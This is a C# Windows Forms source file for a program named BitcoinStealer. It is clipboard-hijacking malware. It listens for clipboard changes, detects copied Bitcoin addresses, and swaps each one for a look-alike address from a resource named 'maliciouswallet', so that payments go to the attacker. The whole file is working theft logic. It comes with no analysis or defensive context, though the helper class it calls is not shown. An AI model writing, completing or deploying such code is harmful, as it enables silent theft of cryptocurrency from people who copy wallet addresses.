using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace BitcoinStealer
{
    public partial class FormBackground : Form
    {
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        private string _origClpbrdTxt;

       
        public FormBackground()
        {
            InitializeComponent();

            AddClipboardFormatListener(Handle);
        }

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);

            
            if (m.Msg != 0x031D) return;

            
            if (!Clipboard.ContainsText()) return;

            var clpbrd = Clipboard.GetText();

          
            if (!stealer.ProbablyBtcAddress(clpbrd)) return;

            
            if (clpbrd == _origClpbrdTxt) return;
            _origClpbrdTxt = clpbrd;

           
            if (
                Resources.maliciouswallet.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
                    .ToList()
                    .Contains(clpbrd)) return;

            
            stealer.SetMostSimilarBtcAddress(clpbrd);
        }
    }
}
